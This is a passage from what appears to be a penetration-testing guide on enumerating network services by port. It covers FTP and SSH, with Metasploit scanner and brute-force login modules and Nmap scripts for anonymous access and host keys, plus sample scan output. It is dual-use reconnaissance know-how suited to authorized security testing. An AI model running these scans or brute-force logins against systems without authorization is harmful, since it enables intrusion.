<li>FTP - Port 21</li>
<li>SSH - Port 22</li>
<li>Telnet - Port 23</li>
<li>SMTP - Port 25 and Submission Port 587</li>
<li>DNS - Port 53</li>
<li>Finger - Port 79</li>
<li>HTTP</li>
<li>Kerberos - Port 88</li>
<li>NetBios</li>
<li>POP3 - Port 110</li>
<li>RPCInfo - Port 111</li>
<li>Ident - Port 113</li>
<li>SNMP - Port 161</li>
<li>Check Point FireWall-1 Topology - Port 264</li>
<li>LDAP - Port 389</li>
<li>SMB - Port 445</li>
<li>rexec - Port 512</li>
<li>rlogin - Port 513</li>
<li>RSH - port 514</li>
<li>AFP - Apple Filing Protocol - Port 548</li>
<li>Microsoft Windows RPC Services - Port 135 and Microsoft RPC Services over HTTP - Port 593</li>
<li>HTTPS - Port 443, 8443</li>
<li>RTSP - Port 554, 8554</li>
<li>Rsync - Port 873</li>
<li>Java RMI - Port 1099</li>
<li>MS-SQL - Port 1433</li>
<li>Oracle - Port 1521</li>
<li>NFS - Port 2049</li>
<li>MySQL - Port 3306</li>
<li>ISCSI - Port 3260</li>
<li>Postgresql - Port 5432</li>
<li>VNC - Port 5900</li>
<li>X11 - Port 6000</li>
<li>PJL - Port 9100</li>
<li>Apache Cassandra - Port 9160</li>
<li>Network Data Management Protocol (ndmp) - Port 10000</li>
<li>Memcache - Port 11211</li>
<li>MongoDB - Port 27017, 27018</li>
<li>EthernetIP-TCP-UDP - Port 44818</li>
<li>UDP BACNet - Port 47808</li>
</ul>
<div class="section" id="ftp-port-21">
<h2>FTP - Port 21<a class="headerlink" href="#ftp-port-21" title="Permalink to this headline">¶</a></h2>
<p>So, on a network we can find multiple version of ftp servers running. Let&#8217;s find out by</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">21</span> <span class="o">-</span><span class="n">c</span> <span class="n">info</span> <span class="o">-</span><span class="n">o</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ftpinfo</span>
<span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ftpinfo</span> <span class="o">|</span> <span class="n">cut</span> <span class="o">-</span><span class="n">d</span> <span class="p">,</span> <span class="o">-</span><span class="n">f2</span> <span class="o">|</span> <span class="n">sort</span> <span class="o">|</span> <span class="n">uniq</span>
</pre></div>
</div>
<p>A Sample output is</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="s2">&quot;Alfresco Document Management System ftpd&quot;</span>
<span class="s2">&quot;D-Link Printer Server ftpd&quot;</span>
<span class="s2">&quot;FreeBSD ftpd 6.00LS&quot;</span>
<span class="s2">&quot;HP JetDirect ftpd&quot;</span>
<span class="s2">&quot;HP LaserJet P4014 printer ftpd&quot;</span>
<span class="s2">&quot;Konica Minolta bizhub printer ftpd&quot;</span>
<span class="s2">&quot;Microsoft ftpd&quot;</span>
<span class="s2">&quot;National Instruments LabVIEW ftpd&quot;</span>
<span class="s2">&quot;NetBSD lukemftpd&quot;</span>
<span class="s2">&quot;Nortel CES1010E router ftpd&quot;</span>
<span class="s2">&quot;oftpd&quot;</span>
<span class="s2">&quot;OpenBSD ftpd 6.4 Linux port 0.17&quot;</span>
<span class="s2">&quot;PacketShaper ftpd&quot;</span>
<span class="s2">&quot;ProFTPD 1.3.3&quot;</span>
<span class="s2">&quot;Pure-FTPd&quot;</span>
<span class="s2">&quot;Ricoh Aficio MP 2000 printer ftpd 6.15&quot;</span>
<span class="s2">&quot;Ricoh Aficio MP 2000 printer ftpd 6.17&quot;</span>
<span class="s2">&quot;Ricoh Aficio MP 2352 printer ftpd 10.67&quot;</span>
<span class="s2">&quot;Ricoh Aficio MP 4002 printer ftpd 11.103&quot;</span>
<span class="s2">&quot;Ricoh Aficio MP W3600 printer ftpd 6.15&quot;</span>
<span class="s2">&quot;Ricoh Aficio SP 3500SF printer ftpd 75905e&quot;</span>
<span class="s2">&quot;vsftpd&quot;</span>
<span class="s2">&quot;vsftpd 2.0.4+ (ext.3)&quot;</span>
<span class="s2">&quot;vsftpd 2.0.5&quot;</span>
<span class="s2">&quot;vsftpd 2.0.8 or later&quot;</span>
<span class="s2">&quot;vsftpd 2.2.2&quot;</span>
<span class="s2">&quot;vsftpd 3.0.2&quot;</span>
<span class="s2">&quot;vsftpd (before 2.0.8) or WU-FTPD&quot;</span>
<span class="s2">&quot;WU-FTPD or MIT Kerberos ftpd 5.60&quot;</span>
<span class="s2">&quot;WU-FTPD or MIT Kerberos ftpd 6.00L</span>
</pre></div>
</div>
<div class="section" id="metasploit">
<h3>Metasploit<a class="headerlink" href="#metasploit" title="Permalink to this headline">¶</a></h3>
<div class="section" id="ftp-version-scanner">
<h4>FTP Version Scanner<a class="headerlink" href="#ftp-version-scanner" title="Permalink to this headline">¶</a></h4>
<p>Detects the ftp version.</p>
<p>This can be done using</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">ftp</span><span class="o">/</span><span class="n">ftp_version</span>
<span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">21</span> <span class="o">-</span><span class="n">R</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">172.16</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">21</span> <span class="n">FTP</span> <span class="n">Banner</span><span class="p">:</span> <span class="s1">&#39;220 BDL095XXXX FTP server ready.</span><span class="se">\x0d\x0a</span><span class="s1">&#39;</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">172.16</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">21</span> <span class="n">FTP</span> <span class="n">Banner</span><span class="p">:</span> <span class="s1">&#39;220 (vsFTPd 2.0.5)</span><span class="se">\x0d\x0a</span><span class="s1">&#39;</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">172.16</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">21</span> <span class="n">FTP</span> <span class="n">Banner</span><span class="p">:</span> <span class="s1">&#39;220 ProFTPD 1.3.2 Server (ProFTPD Default Installation) [172.16.110.51]</span><span class="se">\x0d\x0a</span><span class="s1">&#39;</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">172.16</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">21</span> <span class="n">FTP</span> <span class="n">Banner</span><span class="p">:</span> <span class="s1">&#39;220 pSCn-D1 FTP server (Version 4.2 Tue Feb 19 19:37:47 CST 2013) ready.</span><span class="se">\x0d\x0a</span><span class="s1">&#39;</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">172.16</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">21</span> <span class="n">FTP</span> <span class="n">Banner</span><span class="p">:</span> <span class="s1">&#39;220 pSCn-Dev FTP server (Version 4.2 Tue Feb 19 19:37:47 CST 2013) ready.</span><span class="se">\x0d\x0a</span><span class="s1">&#39;</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Auxiliary</span> <span class="n">module</span> <span class="n">execution</span> <span class="n">completed</span>
</pre></div>
</div>
</div>
<div class="section" id="anonymous-ftp-access-detection">
<h4>Anonymous FTP Access Detection<a class="headerlink" href="#anonymous-ftp-access-detection" title="Permalink to this headline">¶</a></h4>
<p>Detect anonymous (read/write) FTP server access.</p>
<p>A sample of results is</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">21</span> <span class="o">-</span> <span class="n">Anonymous</span> <span class="n">READ</span><span class="o">/</span><span class="n">WRITE</span> <span class="p">(</span><span class="mi">220</span> <span class="n">Microsoft</span> <span class="n">FTP</span> <span class="n">Service</span><span class="p">)</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">21</span> <span class="o">-</span> <span class="n">Anonymous</span> <span class="n">READ</span> <span class="p">(</span><span class="mi">220</span> <span class="n">Microsoft</span> <span class="n">FTP</span> <span class="n">Service</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="section" id="ftp-authentication-scanner">
<h4>FTP Authentication Scanner<a class="headerlink" href="#ftp-authentication-scanner" title="Permalink to this headline">¶</a></h4>
<p>FTP Authentication Scanner which will test FTP logins on a range of machines and report successful logins.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">ftp</span><span class="o">/</span><span class="n">ftp_login</span>
<span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">21</span> <span class="o">-</span><span class="n">R</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">Yet</span> <span class="n">to</span> <span class="n">run</span>
</pre></div>
</div>
</div>
<div class="section" id="ftp-bounce-port-scanner">
<h4>FTP Bounce Port Scanner<a class="headerlink" href="#ftp-bounce-port-scanner" title="Permalink to this headline">¶</a></h4>
<p>Enumerate TCP services via the FTP bounce PORT/LIST method.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">portscan</span><span class="o">/</span><span class="n">ftpbounce</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="nmap">
<h3>Nmap<a class="headerlink" href="#nmap" title="Permalink to this headline">¶</a></h3>
<div class="section" id="ftp-anon">
<h4>ftp-anon<a class="headerlink" href="#ftp-anon" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/ftp-anon.html">ftp-anon.nse</a> : Checks if an FTP server allows anonymous logins. If anonymous is allowed, gets a directory listing of the root directory and highlights writeable files.</p>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">sV</span> <span class="o">--</span><span class="n">script</span> <span class="n">ftp</span><span class="o">-</span><span class="n">anon</span> <span class="o">-</span><span class="n">p</span> <span class="mi">21</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>

<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.01</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">03</span> <span class="mi">21</span><span class="p">:</span><span class="mi">53</span> <span class="n">IST</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.018</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">VERSION</span>
<span class="mi">21</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ftp</span>     <span class="n">vsftpd</span> <span class="mf">2.2</span><span class="o">.</span><span class="mi">2</span>
<span class="o">|</span> <span class="n">ftp</span><span class="o">-</span><span class="n">anon</span><span class="p">:</span> <span class="n">Anonymous</span> <span class="n">FTP</span> <span class="n">login</span> <span class="n">allowed</span> <span class="p">(</span><span class="n">FTP</span> <span class="n">code</span> <span class="mi">230</span><span class="p">)</span>
<span class="o">|</span><span class="n">_drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>    <span class="mi">2</span> <span class="mi">0</span>        <span class="mi">0</span>            <span class="mi">4096</span> <span class="n">Jun</span> <span class="mi">25</span>  <span class="mi">2011</span> <span class="n">pub</span>
<span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">OS</span><span class="p">:</span> <span class="n">Unix</span>
</pre></div>
</div>
</div>
<div class="section" id="ftp-brute">
<h4>ftp-brute<a class="headerlink" href="#ftp-brute" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/ftp-brute.html">ftp-brute.nse</a> : Performs brute force password auditing against FTP servers.</p>
</div>
<div class="section" id="ftp-bounce">
<h4>ftp-bounce<a class="headerlink" href="#ftp-bounce" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/ftp-bounce.html">ftp-bounce.nse</a> : Checks to see if an FTP server allows port scanning using the FTP bounce method.</p>
</div>
</div>
</div>
<div class="section" id="ssh-port-22">
<h2>SSH - Port 22<a class="headerlink" href="#ssh-port-22" title="Permalink to this headline">¶</a></h2>
<div class="section" id="id1">
<h3>Metasploit<a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h3>
<div class="section" id="ssh-version-scanner">
<h4>SSH Version Scanner<a class="headerlink" href="#ssh-version-scanner" title="Permalink to this headline">¶</a></h4>
<p>Detects SSH version.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">ssh</span><span class="o">/</span><span class="n">ssh_version</span>
<span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">22</span> <span class="o">-</span><span class="n">u</span> <span class="o">-</span><span class="n">R</span>
</pre></div>
</div>
<p>Sample output</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.23</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">22</span> <span class="n">SSH</span> <span class="n">server</span> <span class="n">version</span><span class="p">:</span> <span class="n">SSH</span><span class="o">-</span><span class="mf">2.0</span><span class="o">-</span><span class="n">OpenSSH_5</span><span class="o">.</span><span class="mi">8</span> <span class="p">(</span> <span class="n">service</span><span class="o">.</span><span class="n">version</span><span class="o">=</span><span class="mf">5.8</span> <span class="n">service</span><span class="o">.</span><span class="n">vendor</span><span class="o">=</span><span class="n">OpenBSD</span> <span class="n">service</span><span class="o">.</span><span class="n">family</span><span class="o">=</span><span class="n">OpenSSH</span> <span class="n">service</span><span class="o">.</span><span class="n">product</span><span class="o">=</span><span class="n">OpenSSH</span> <span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.23</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">22</span> <span class="n">SSH</span> <span class="n">server</span> <span class="n">version</span><span class="p">:</span> <span class="n">SSH</span><span class="o">-</span><span class="mf">2.0</span><span class="o">-</span><span class="mi">9</span><span class="n">nroL</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.23</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">22</span> <span class="n">SSH</span> <span class="n">server</span> <span class="n">version</span><span class="p">:</span> <span class="n">SSH</span><span class="o">-</span><span class="mf">1.99</span><span class="o">-</span><span class="n">Cisco</span><span class="o">-</span><span class="mf">1.25</span> <span class="p">(</span> <span class="n">service</span><span class="o">.</span><span class="n">version</span><span class="o">=</span><span class="mf">1.25</span> <span class="n">service</span><span class="o">.</span><span class="n">vendor</span><span class="o">=</span><span class="n">Cisco</span> <span class="n">service</span><span class="o">.</span><span class="n">product</span><span class="o">=</span><span class="n">SSH</span> <span class="n">os</span><span class="o">.</span><span class="n">vendor</span><span class="o">=</span><span class="n">Cisco</span> <span class="n">os</span><span class="o">.</span><span class="n">product</span><span class="o">=</span><span class="n">IOS</span> <span class="n">os</span><span class="o">.</span><span class="n">certainty</span><span class="o">=</span><span class="mf">0.8</span> <span class="p">)</span>
</pre></div>
</div>
<p>There&#8217;s a auxilary module to try</p>
</div>
<div class="section" id="ssh-brute-force">
<h4>SSH Brute force<a class="headerlink" href="#ssh-brute-force" title="Permalink to this headline">¶</a></h4>
<p>SSH Login Check Scanner will test ssh logins on a range of machines and report successful logins. Caution: BruteForce.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">ssh</span><span class="o">/</span><span class="n">ssh_login</span>
<span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">22</span> <span class="o">-</span><span class="n">u</span> <span class="o">-</span><span class="n">R</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="id2">
<h3>Nmap<a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h3>
<p>has three NSE</p>
<div class="section" id="ssh2-enum-algos">
<h4>ssh2-enum-algos<a class="headerlink" href="#ssh2-enum-algos" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/ssh2-enum-algos.html">ssh2-enum-algos.nse</a> : Reports the number of algorithms (for encryption, compression, etc.) that the target SSH2 server offers. If verbosity is set, the offered algorithms are each listed by type.</p>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">--</span><span class="n">script</span> <span class="n">ssh2</span><span class="o">-</span><span class="n">enum</span><span class="o">-</span><span class="n">algos</span> <span class="o">-</span><span class="n">p</span> <span class="mi">22</span> <span class="o">-</span><span class="n">n</span> <span class="mf">103.206</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>

<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.01</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">03</span> <span class="mi">22</span><span class="p">:</span><span class="mi">04</span> <span class="n">IST</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">103.206</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.018</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span>
<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>
<span class="o">|</span> <span class="n">ssh2</span><span class="o">-</span><span class="n">enum</span><span class="o">-</span><span class="n">algos</span><span class="p">:</span>
<span class="o">|</span>   <span class="n">kex_algorithms</span><span class="p">:</span> <span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="o">|</span>       <span class="n">diffie</span><span class="o">-</span><span class="n">hellman</span><span class="o">-</span><span class="n">group</span><span class="o">-</span><span class="n">exchange</span><span class="o">-</span><span class="n">sha256</span>
<span class="o">|</span>       <span class="n">diffie</span><span class="o">-</span><span class="n">hellman</span><span class="o">-</span><span class="n">group</span><span class="o">-</span><span class="n">exchange</span><span class="o">-</span><span class="n">sha1</span>
<span class="o">|</span>       <span class="n">diffie</span><span class="o">-</span><span class="n">hellman</span><span class="o">-</span><span class="n">group14</span><span class="o">-</span><span class="n">sha1</span>
<span class="o">|</span>       <span class="n">diffie</span><span class="o">-</span><span class="n">hellman</span><span class="o">-</span><span class="n">group1</span><span class="o">-</span><span class="n">sha1</span>
<span class="o">|</span>   <span class="n">server_host_key_algorithms</span><span class="p">:</span> <span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="o">|</span>       <span class="n">ssh</span><span class="o">-</span><span class="n">dss</span>
<span class="o">|</span>       <span class="n">ssh</span><span class="o">-</span><span class="n">rsa</span>
<span class="o">|</span>   <span class="n">encryption_algorithms</span><span class="p">:</span> <span class="p">(</span><span class="mi">9</span><span class="p">)</span>
<span class="o">|</span>       <span class="n">aes128</span><span class="o">-</span><span class="n">ctr</span>
<span class="o">|</span>       <span class="n">aes192</span><span class="o">-</span><span class="n">ctr</span>
<span class="o">|</span>       <span class="n">aes256</span><span class="o">-</span><span class="n">ctr</span>
<span class="o">|</span>       <span class="n">aes128</span><span class="o">-</span><span class="n">cbc</span>
<span class="o">|</span>       <span class="n">aes192</span><span class="o">-</span><span class="n">cbc</span>
<span class="o">|</span>       <span class="n">aes256</span><span class="o">-</span><span class="n">cbc</span>
<span class="o">|</span>       <span class="n">blowfish</span><span class="o">-</span><span class="n">cbc</span>
<span class="o">|</span>       <span class="mi">3</span><span class="n">des</span><span class="o">-</span><span class="n">cbc</span>
<span class="o">|</span>       <span class="n">none</span>
<span class="o">|</span>   <span class="n">mac_algorithms</span><span class="p">:</span> <span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="o">|</span>       <span class="n">hmac</span><span class="o">-</span><span class="n">sha1</span>
<span class="o">|</span>       <span class="n">hmac</span><span class="o">-</span><span class="n">md5</span>
<span class="o">|</span>   <span class="n">compression_algorithms</span><span class="p">:</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="o">|</span><span class="n">_</span>      <span class="n">none</span>

<span class="n">Nmap</span> <span class="n">done</span><span class="p">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="ow">in</span> <span class="mf">0.65</span> <span class="n">seconds</span>
</pre></div>
</div>
</div>
<div class="section" id="ssh-hostkey">
<h4>SSH-Hostkey<a class="headerlink" href="#ssh-hostkey" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/ssh-hostkey.html">ssh-hostkey.nse</a> : Shows SSH hostkeys</p>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">--</span><span class="n">script</span> <span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span> <span class="o">-</span><span class="n">p</span> <span class="mi">22</span> <span class="o">-</span><span class="n">n</span> <span class="mf">103.206</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span> <span class="n">ssh_hostkey</span><span class="o">=</span><span class="n">full</span>

<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.01</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">03</span> <span class="mi">22</span><span class="p">:</span><span class="mi">07</span> <span class="n">IST</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">103.206</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.019</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span>
<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>
<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span>
<span class="o">|</span>   <span class="n">ssh</span><span class="o">-</span><span class="n">dss</span> <span class="n">AAAAB3NzaC1kc3MAAACBAOohTo8BeSsafI78mCTp7vz1ETkdSXNj8wgrYMD</span><span class="o">+</span><span class="n">DOEDpdfMEqYJOFPUWiyK0HrkyrP7UyODp9SEcrOzem98iDUgvPZFfSRhKpdTktQtt9</span><span class="o">+</span><span class="mi">9</span><span class="n">mzDpfHgqryD04o2JvjZc6HlMwZToulurZwgt0</span><span class="o">+</span><span class="n">npep8Asb32lRCGAkFpPA7r3NdfAAAAFQDypzDnHTTgcy</span><span class="o">/</span><span class="n">vQNUDe</span><span class="o">+</span><span class="n">RlnFxX0wAAAIAXBBnv</span><span class="o">/</span><span class="n">P1RyzGdGM</span><span class="o">+</span><span class="n">JX2tbM6gJvC4WNoq7Okdh1ZH2Rxn1plU</span><span class="o">+</span><span class="n">oTt189ZI5UcR67x504o5fXVZ0pj3yJh6yMQFfsw89iSbTGmM6V1wYnq</span><span class="o">+</span><span class="n">s1Lz83XvgHIepV0OdOj2HE4tCytS6md0udLSio6RlWTVG</span><span class="o">/</span><span class="mi">8</span><span class="n">vFrwb</span><span class="o">/</span><span class="n">C2KoL36JiIABgAAAIAUTOQm2</span><span class="o">+</span><span class="n">LVNqISuZT</span><span class="o">/</span><span class="n">doDbz5H89dCbLyL0uNiPRGW3XGjsZrW</span><span class="o">/</span><span class="n">iyvN</span><span class="o">/</span><span class="n">FQ1Lz0vai1db3UPbkNvhQNhOIJtAYClyQg1bTjvBCV2YvG9P91Ljyl6avSUoPEDg7h46E90TpneFa0tRf</span><span class="o">+</span><span class="n">V3RBC4KbXHrelgHye</span><span class="o">+</span><span class="mi">2</span><span class="n">ZUkaebOmsRt2h4sQ</span><span class="o">==</span>
<span class="o">|</span><span class="n">_</span>  <span class="n">ssh</span><span class="o">-</span><span class="n">rsa</span> <span class="n">AAAAB3NzaC1yc2EAAAADAQABAAABAQDIRocXKgi0l3kZeVNEPlMXBBDj4WYAPFzNgf63</span><span class="o">+</span><span class="n">e</span><span class="o">/</span><span class="n">RMN5DSYz4AmVw1V8o</span><span class="o">+</span><span class="n">gsaL3mCeMwRdMfPCVlDdFPRDbZhyXNiG2vstc</span><span class="o">+</span><span class="n">gbeOHyDaLuQJVMF</span><span class="o">/++</span><span class="n">M8Yw9GWr7dOOA9zUfRkYVrQT53bfYzSpiulZpAbnkY0X5Ma40aO56Sq4H1NNqb7ZBdCWmder3veBq</span><span class="o">+</span><span class="mi">6</span><span class="n">R9z</span><span class="o">+</span><span class="n">xSY0ji5Csr52bIl2Bka36KfYx325rrUP</span><span class="o">//</span><span class="n">lWDUDwK</span><span class="o">+</span><span class="n">hQ8jL9EjP884uPflRJPqdxoWLK001exSPHmcZOFNCeb2TQSkTbJVIh5Qg55eel2d0f</span><span class="o">/</span><span class="n">YZe24b6SalaANsZHt9MyG6Q5DNbtWvV2ixV</span>

<span class="n">Nmap</span> <span class="n">done</span><span class="p">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="ow">in</span> <span class="mf">3.02</span> <span class="n">seconds</span>
</pre></div>
</div>
</div>
<div class="section" id="sshv1">
<h4>SSHv1<a class="headerlink" href="#sshv1" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/sshv1.html">sshv1.nse</a> : Checks if an SSH server supports the obsolete and less secure SSH Protocol Version 1.</p>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">--</span><span class="n">script</span> <span class="n">sshv1</span> <span class="o">-</span><span class="n">p</span> <span class="mi">22</span> <span class="o">-</span><span class="n">n</span> <span class="mf">203.134</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>

<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.01</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">03</span> <span class="mi">23</span><span class="p">:</span><span class="mi">16</span> <span class="n">IST</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">203.134</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.042</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span>
<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>
<span class="o">|</span><span class="n">_sshv1</span><span class="p">:</span> <span class="n">Server</span> <span class="n">supports</span> <span class="n">SSHv1</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="telnet-port-23">
<h2>Telnet - Port 23<a class="headerlink" href="#telnet-port-23" title="Permalink to this headline">¶</a></h2>
<div class="section" id="id3">
<h3>Metasploit<a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h3>
<div class="section" id="telnet-version">
<h4>Telnet version<a class="headerlink" href="#telnet-version" title="Permalink to this headline">¶</a></h4>
<p>Detects telnet version.</p>
